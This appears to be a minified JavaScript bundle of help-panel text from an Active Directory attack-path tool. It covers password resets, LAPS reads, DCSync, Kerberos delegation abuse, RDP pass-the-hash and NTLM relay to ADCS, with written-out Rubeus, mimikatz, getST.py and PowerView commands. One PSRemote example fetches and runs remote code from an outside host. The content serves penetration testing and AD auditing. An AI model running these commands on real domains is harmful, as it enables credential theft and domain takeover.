$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),e.jsx(t,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),e.jsxs(t,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."})]});case"Computer":return e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The AllExtendedRights permission allows ",r," to retrieve the LAPS (RID 500 administrator) password for ",o,"."]}),e.jsxs(t,{variant:"body2",children:["For systems using legacy LAPS, the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwd"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwdExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{})]}),e.jsxs(t,{variant:"body2",children:["For systems using Windows LAPS (2023 edition), the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-Password"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-PasswordExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPassword"}),": The encrypted LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPasswordHistory"}),": The encrypted LAPS password history",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPassword"}),": The encrypted Directory Services Restore Mode (DSRM) password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPasswordHistory"}),": The encrypted DSRM password history",e.jsx("br",{})]}),e.jsx(t,{variant:"body2",children:"Plaintext attributes can be read using a simple LDAP client. For example, with PowerView:"}),e.jsx(t,{component:"pre",children:'Get-DomainComputer "MachineName" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"'}),e.jsx(t,{variant:"body2",children:"Encrypted attributes can be decrypted using Microsoft's LAPS PowerShell module. For example:"}),e.jsx(t,{component:"pre",children:'Get-LapsADPassword "WIN10" -AsPlainText'}),e.jsxs(t,{variant:"body2",children:["The encrypted attributes can also be retrieved and decrypted using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt",children:"lapsv2decrypt"})," ","(dotnet or BOF)."]})]});case"Domain":return e.jsxs(t,{variant:"body2",children:["The AllExtendedRights permission grants ",r," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",o,". This can be abused using the lsadump::dcsync command in mimikatz."]});case"CertTemplate":return e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The AllExtendedRights permission grants ",r," enrollment rights on the certificate template ",o,"."]}),e.jsx(t,{variant:"body2",children:"Certify can be used to enroll a certificate:"}),e.jsx(t,{component:"pre",children:"Certify.exe request --ca SERVER\\CA-NAME --template TEMPLATE"}),e.jsxs(t,{variant:"body2",children:["The following additional requirements must be met for a principal to be able to enroll a certificate:",e.jsx("br",{}),"1) The certificate template is published on an enterprise CA",e.jsx("br",{}),"2) The principal has Enroll permission on the enterprise CA",e.jsx("br",{}),"3) The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template"]})]});default:return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse information available for this node type."})})}},rd={general:Jl,windowsAbuse:td,linuxAbuse:Xl,opsec:Zl,references:ed},nd=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," is added to the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer ",o,"."]}),e.jsx(t,{variant:"body2",children:'An attacker can use this account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.'}),e.jsx(t,{variant:"body2",children:'One caveat is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.'})]}),ad=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`We can then get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."})]}),od=()=>e.jsx(t,{variant:"body2",children:"To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain."}),id=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota",children:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota"})]}),sd=({sourceName:r})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"To use this attack, the controlled account MUST have a service principal name set, along with access to either the plaintext or the RC4_HMAC hash of the account."}),e.jsx(t,{variant:"body2",children:"If the plaintext password is available, you can hash it to the RC4_HMAC version using Rubeus:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`Use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:`Rubeus.exe s4u /user:${r}$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt`})]}),cd={general:nd,windowsAbuse:sd,linuxAbuse:ad,opsec:od,references:id},ld=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r," has the constrained delegation permission to the computer"," ",o,"."]}),e.jsx(t,{variant:"body2",children:'The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer. That is, a node with this permission can impersonate any domain principal (including Domain Admins) to the specific service on the target host. One caveat- impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked.'}),e.jsx(t,{variant:"body2",children:'An issue exists in the constrained delegation where the service name (sname) of the resulting ticket is not a part of the protected ticket information, meaning that an attacker can modify the target service name to any service of their choice. For example, if msds-AllowedToDelegateTo is "HTTP/host.domain.com", tickets can be modified for LDAP/HOST/etc. service names, resulting in complete server compromise, regardless of the specific service listed.'})]}),dd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:'In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin" user to the "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the final service ticket. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the "admin" user.'}),e.jsx(t,{component:"pre",children:"getST.py -spn 'HTTP/PRIMARY.testlab.local' -impersonate 'admin' -altservice 'cifs' -hashes :2b576acbe6bcfda7294d6bd18041b8fe 'domain/victim'"})]}),hd=()=>e.jsx(t,{variant:"body2",children:"As mentioned in the abuse info, in order to currently abuse this primitive the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. See the References for more information."}),pd=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/trust-years-to-earn-seconds-to-break",children:"https://labs.withsecure.com/publications/trust-years-to-earn-seconds-to-break"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/activedirectory/s4u2pwnage/",children:"https://blog.harmj0y.net/activedirectory/s4u2pwnage/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://twitter.com/gentilkiwi/status/806643377278173185",children:"https://twitter.com/gentilkiwi/status/806643377278173185"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more",children:"https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/from-kekeo-to-rubeus/",children:"https://blog.harmj0y.net/redteaming/from-kekeo-to-rubeus/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained"})]}),ud=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Abusing this privilege can utilize Benjamin Delpy's Kekeo project, proxying in traffic generated from the Impacket library, or using the Rubeus project's s4u abuse."}),e.jsx(t,{variant:"body2",children:'In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin" user to the "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the final service ticket and the ticket is submitted to the current logon session. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the "admin" user.'}),e.jsx(t,{component:"pre",children:'Rubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:"HTTP/PRIMARY.testlab.local" /altservice:cifs /ptt'})]}),md={general:ld,windowsAbuse:ud,linuxAbuse:dd,opsec:hd,references:pd},bd=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Abuse of this privilege will require you to have interactive access with a system on the network."}),e.jsx(t,{variant:"body2",children:"A remote session can be opened using the New-PSSession powershell command."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with New-PSSession, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then use the New-PSSession command with the credential we just created:"}),e.jsx(t,{component:"pre",children:`$session = New-PSSession -ComputerName ${o} -Credential $Cred`}),e.jsxs(t,{variant:"body2",children:["This will open a powershell session on ",o,"."]}),e.jsx(t,{variant:"body2",children:"You can then run a command on the system using the Invoke-Command cmdlet and the session you just created"}),e.jsx(t,{component:"pre",children:"Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}"}),e.jsx(t,{variant:"body2",children:"Cleanup of the session is done with the Disconnect-PSSession and Remove-PSSession commands."}),e.jsx(t,{component:"pre",children:`Disconnect-PSSession -Session $session
Remove-PSSession -Session $session`}),e.jsx(t,{variant:"body2",children:"An example of running through this cobalt strike for lateral movement is as follows:"}),e.jsx(t,{component:"pre",children:"powershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))}; Disconnect-PSSession -Session $session; Remove-PSSession -Session $session"})]}),fd=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the capability to create a PSRemote Connection with the computer ",o,"."]}),e.jsx(t,{variant:"body2",children:"PS Session access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system."}),e.jsx(t,{variant:"body2",children:"Note: This edge does not guarantee privileged execution."})]}),yd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"When using the PowerShell functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI."}),e.jsx(t,{variant:"body2",children:"Entering a PSSession will generate a logon event on the target computer."})]}),gd=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7",children:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7",children:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7"})]}),xd={general:fd,abuse:bd,opsec:yd,references:gd},jd=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Abuse of this privilege will depend heavily on the type of access you have."}),e.jsx(t,{variant:"body1",children:"PlainText Credentials with Interactive Access"}),e.jsxs(t,{variant:"body2",children:["With plaintext credentials, the easiest way to exploit this privilege is using the built in Windows Remote Desktop Client (mstsc.exe). Open mstsc.exe and input the computer ",o,". When prompted for credentials, input the credentials for"," ",a==="Group"?`a member of ${r}`:`${r}`," to initiate the remote desktop connection."]}),e.jsx(t,{variant:"body1",children:"Password Hash with Interactive Access"}),e.jsx(t,{variant:"body2",children:"With a password hash, exploitation of this privilege will require local administrator privileges on a system, and the remote server must allow Restricted Admin Mode."}),e.jsx(t,{variant:"body2",children:"First, inject the NTLM credential for the user you're abusing into memory using mimikatz:"}),e.jsx(t,{component:"pre",children:'lsadump::pth /user:dfm /domain:testlab.local /ntlm:&lt;ntlm hash&gt; /run:"mstsc.exe /restrictedadmin"'}),e.jsxs(t,{variant:"body2",children:["This will open a new RDP window. Input the computer ",o," to initiate the remote desktop connection. If the target server does not support Restricted Admin Mode, the session will fail."]}),e.jsx(t,{variant:"body1",children:"Plaintext Credentials without Interactive Access"}),e.jsx(t,{variant:"body2",children:"This method will require some method of proxying traffic into the network, such as the socks command in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:"}),e.jsx(t,{component:"pre",children:"(proxychains) xfreerdp /u:dfm /d:testlab.local /v:<computer ip>"}),e.jsx(t,{variant:"body2",children:"xfreerdp will prompt you for a password, and then initiate the remote desktop connection."}),e.jsx(t,{variant:"body1",children:"Password Hash without Interactive Access"}),e.jsx(t,{variant:"body2",children:"This method will require some method of proxying traffic into the network, such as the socks command in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. Additionally, the target computer must allow Restricted Admin Mode. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:"}),e.jsx(t,{component:"pre",children:"(proxychains) xfreerdp /pth:<ntlm hash> /u:dfm /d:testlab.local /v:<computer ip>"}),e.jsx(t,{variant:"body2",children:"This will initiate the remote desktop connection, and will fail if Restricted Admin Mode is not enabled."})]}),wd=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the capability to create a Remote Desktop Connection with the computer ",o,"."]}),e.jsx(t,{variant:"body2",children:"Remote Desktop access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system."}),e.jsx(t,{variant:"body2",children:"Note: This edge does not guarantee privileged execution."})]}),vd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"If the target computer is a workstation and a user is currently logged on, one of two things will happen. If the user you are abusing is the same user as the one logged on, you will effectively take over their session and kick the logged on user off, resulting in a message to the user. If the users are different, you will be prompted to kick the currently logged on user off the system and log on. If the target computer is a server, you will be able to initiate the connection without issue provided the user you are abusing is not currently logged in."}),e.jsx(t,{variant:"body2",children:"Remote desktop will create Logon and Logoff events with the access type RemoteInteractive."})]}),Ad=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://michael-eder.net/post/2018/native_rdp_pass_the_hash/",children:"https://michael-eder.net/post/2018/native_rdp_pass_the_hash/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.kali.org/penetration-testing/passing-hash-remote-desktop/",children:"https://www.kali.org/penetration-testing/passing-hash-remote-desktop/"})]}),Sd={general:wd,abuse:jd,opsec:vd,references:Ad},Cd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Guest Account"}),e.jsxs(t,{variant:"body2",children:["The Guest user account allows users without a personal account to log in. The account has no password by default.",e.jsx("br",{}),"If enabled, anyone with AD access can log in with the Guest account."]}),e.jsx(t,{variant:"body1",children:"Network Identity"}),e.jsx(t,{variant:"body2",children:"Any user or computer accessing a Windows system via a network has the Network identity in their access token."}),e.jsx(t,{variant:"body1",children:"Authentication Authority Asserted Identity"}),e.jsx(t,{variant:"body2",children:"Included in access tokens when an account is authenticated directly against a domain controller and not through Kerberos constrained delegation (service asserted identity)."}),e.jsx(t,{variant:"body1",children:"Key Trust"}),e.jsxs(t,{variant:"body2",children:["Included in access tokens when authentication is based on public key credentials via key trust objects.",e.jsx("br",{}),"Anyone with key trust credentials (e.g., from a Shadow Credentials attack) can obtain Key Trust identity access through PKINIT authentication."]}),e.jsx(t,{variant:"body1",children:"MFA Key Property"}),e.jsxs(t,{variant:"body2",children:["Similar to Key Trust but requires the MFA property on the key trust credentials.",e.jsx("br",{}),"A Shadow Credentials attack enables anyone to obtain the MFA Key Property identity access through PKINIT authentication."]}),e.jsx(t,{variant:"body1",children:"NTLM Authentication"}),e.jsxs(t,{variant:"body2",children:["Included in an access token when authentication occurs via NTLM protocol.",e.jsx("br",{}),"Any AD account can obtain NTLM authentication identity access, assuming NTLM is available."]}),e.jsx(t,{variant:"body1",children:"Schannel Authentication"}),e.jsxs(t,{variant:"body2",children:["Included in an access token when authentication occurs via Schannel protocol.",e.jsx("br",{}),"Any AD account can obtain the Schannel Authentication identity, for example by performing certificate authentication over Schannel."]}),e.jsx(t,{variant:"body1",children:"This Organization Identity"}),e.jsx(t,{variant:"body2",children:"Assigned to all accounts within the same Active Directory forest and trusted forests without selective authentication."}),e.jsx(t,{variant:"body1",children:"This Organization Certificate Identity"}),e.jsxs(t,{variant:"body2",children:["Assigned to all accounts within the same Active Directory forest and trusted forests without selective authentication, when the Kerberos PAC contains an NTLM_SUPPLEMENTAL_CREDENTIAL structure.",e.jsx("br",{}),"Authentication using an ADCS certificate ensures the required PAC structure."]})]}),kd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The ClaimSpecialIdentity edge represents the ability to obtain an access token containing a special identity (group) SID. Unlike regular groups, membership in special identities is determined at authentication rather than by an explicit member list."}),e.jsx(t,{variant:"body2",children:"See the Abuse section for specific cases."})]}),Td=()=>e.jsx(t,{variant:"body2",children:"No OPSEC considerations are available for this edge."}),Pd=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-special-identities-groups",children:"Microsoft: Special identity groups"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-default-user-accounts#guest-account",children:"Microsoft: Guest account"})]}),Dd={general:kd,abuse:Cd,opsec:Td,references:Pd},Od=({sourceDBId:r,targetDBId:a,edgeName:o})=>{const{isLoading:i,isError:s,nodesArray:c}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.composition});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The relationship represents the effective outcome of the configuration and relationships between several different objects. All objects involved in the creation of this relationship are listed here:"}),e.jsx(l,{py:1,children:i?e.jsx(H,{variant:"rounded"}):s?e.jsx(K,{severity:"error",children:"Couldn't load edge composition"}):e.jsx(X,{nodes:c})})]})},Rd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:'This edge indicates that an attacker with "Authenticated Users" access can trigger SMB-based coercion from the target computer to their attacker-controlled host via NTLM. The authentication attempt from the target computer can then be relayed to an ESC8-vulnerable web enrollment endpoint of an Active Directory Certificate Services (ADCS) enterprise CA server. This allows the attacker to obtain a certificate enabling domain authentication as the target computer.'}),e.jsx(t,{variant:"body2",children:"Click on Relay Targets to view vulnerable enterprise CA servers that enable certificate enrollment for the target computer."})]}),Ed=()=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["1. Start the Relay Server The NTLM relay can be executed with"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",children:"ntlmrelayx.py"}),". To relay to the enterprise CA and enroll a certificate, specify the HTTP(S) endpoint as the target and use the arguments",e.jsx(w,{children:"--adcs --template <TEMPLATE_NAME>."})]}),e.jsxs(t,{variant:"body2",children:["2. Coerce the Target Computer Several coercion methods are documented here:"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),". Examples of tools include:",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py",children:"printerbug.py"}),e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/topotam/PetitPotam",children:"PetitPotam"}),"To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE."]})]}),Id=()=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Detection of NTLM Relay"}),e.jsx("br",{}),"NTLM relayed authentications can be detected by login events where the IP address does not match the computer’s actual IP address. This detection technique is described in the blog post:"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://posts.bluraven.io/detecting-ntlm-relay-attacks-d92e99e68fb9",children:"Detecting NTLM Relay Attacks"}),"."]}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Detection of Certificate Usage"}),e.jsx("br",{}),'Authentication using the obtained certificate is another detection opportunity. If Kerberos authentication is used, a domain controller will generate Windows Event ID 4768 ("A Kerberos authentication ticket (TGT) was requested"). This event will include the attacker’s IP address rather than the target computer’s IP address. Similarly, for Schannel authentication, Event ID 4624 will reveal the incorrect IP address. These detection techniques are described in detail under DETECT2 in the whitepaper:',e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"Certified Pre-Owned."})]})]}),$d=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://en.hackndo.com/ntlm-relay/",children:"Hackndo: NTLM relay"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview",children:"Microsoft: NTLM Overview"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac",children:"Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Inveigh",children:"Inveigh"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/topotam/PetitPotam",children:"PetitPotam"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/leechristensen/SpoolSample",children:"SpoolSample"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.guidepointsecurity.com/blog/beyond-the-basics-exploring-uncommon-ntlm-relay-attack-techniques/",children:"Beyond the Basics: Exploring Uncommon NTLM Relay Attack Techniques"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py",children:"printerbug.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022",children:"I’m bringing relaying back: A comprehensive guide on relaying anno 2022"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",children:"ntlmrelayx.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://support.microsoft.com/en-us/topic/2020-2023-and-2024-ldap-channel-binding-and-ldap-signing-requirements-for-windows-kb4520412-ef185fb8-00f7-167d-744c-f299a66fc00a",children:"2020, 2023, and 2024 LDAP channel binding and LDAP signing requirements for Windows (KB4520412)"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.bluraven.io/detecting-ntlm-relay-attacks-d92e99e68fb9",children:"Detecting NTLM Relay Attacks"})]}),Gd=({sourceDBId:r,targetDBId:a,edgeName:o,onNodeClick:i})=>{const{isLoading:s,isError:c,nodesArray:d}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.relayTargets});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The nodes in this list are valid relay targets for this attack. Examine the node to view the list of vulnerable endpoints"}),e.jsx(l,{py:1,children:s?e.jsx(H,{variant:"rounded"}):c?e.jsx(K,{severity:"error",children:"Couldn't load relay targets"}):e.jsx(X,{nodes:d})})]})},Nd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"1: Start the Relay Server The NTLM relay can be executed with Inveigh."}),e.jsxs(t,{variant:"body2",children:["2: Coerce the Target Computer Several coercion methods are documented here:"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),". 